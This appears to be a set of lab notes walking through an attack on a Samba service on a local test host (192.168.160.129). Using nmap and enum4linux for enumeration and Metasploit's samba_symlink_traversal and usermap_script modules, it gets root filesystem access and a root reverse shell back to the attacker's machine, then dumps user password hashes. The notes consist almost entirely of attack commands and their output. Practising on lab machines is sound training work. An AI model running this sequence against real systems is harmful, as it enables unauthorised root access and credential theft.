## **Enumeration**

```bash
nmap -sV -sC -vV 192.168.160.129
```
![[Pasted image 20241020170252.png]]
## **Enumerating the SMB shares**

```sh
enum4linux -L -S 192.168.160.129
```
![[Pasted image 20241020170350.png]]

## **Launch Metasploit**

> msfconsole

### **Exploiting SMB Using symlink_traversal**
```
msf6 auxiliary(scanner/ssh/ssh_login) > use auxiliary/admin/smb/samba_symlink_traversal  
msf6 auxiliary(admin/smb/samba_symlink_traversal) > set RHOSTS 192.168.160.129  
RHOSTS => 192.168.160.129  
msf6 auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmp  
SMBSHARE => tmp  
msf6 auxiliary(admin/smb/samba_symlink_traversal) > run  
[*] Running module against 192.168.160.129  
[*] 192.168.160.129:445 — Connecting to the server…  
[*] 192.168.160.129:445 — Trying to mount writeable share ‘tmp’…  
[*] 192.168.160.129:445 — Trying to link ‘rootfs’ to the root filesystem…  
[*] 192.168.160.129:445 — Now access the following share to browse the root filesystem:  
[*] 192.168.160.129:445 — \\192.168.160.129\tmp\rootfs\  
[*] Auxiliary module execution completed  
  
exit
```

```
smbclient — no-pass //192.168.160.129/tmp 
cd rootfs;ls
```
![[Pasted image 20241020170640.png]]
## **Exploiting SMB Using usermap_script**
```
msf6 auxiliary(admin/smb/samba_symlink_traversal) > use exploit/multi/samba/usermap_script  
[*] No payload configured, defaulting to cmd/unix/reverse_netcat  
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.160.129  
RHOSTS => 192.168.160.129  
msf6 exploit(multi/samba/usermap_script) > run  
[*] Started reverse TCP handler on 192.168.160.128:4444   
[*] Command shell session 1 opened (192.168.160.128:4444 -> 192.168.160.129:46840) at 2024–02–11 14:41:48 -0500  
id  
uid=0(root) gid=0(root)
```

## **Dumping the user hashes**
```
Ctrl Z

msf6 exploit(multi/samba/usermap_script) > use post/linux/gather/hashdump  
msf6 post(linux/gather/hashdump) > set SESSION 1  
SESSION => 1  
msf6 post(linux/gather/hashdump) > run
```
![[Pasted image 20241020170746.png]]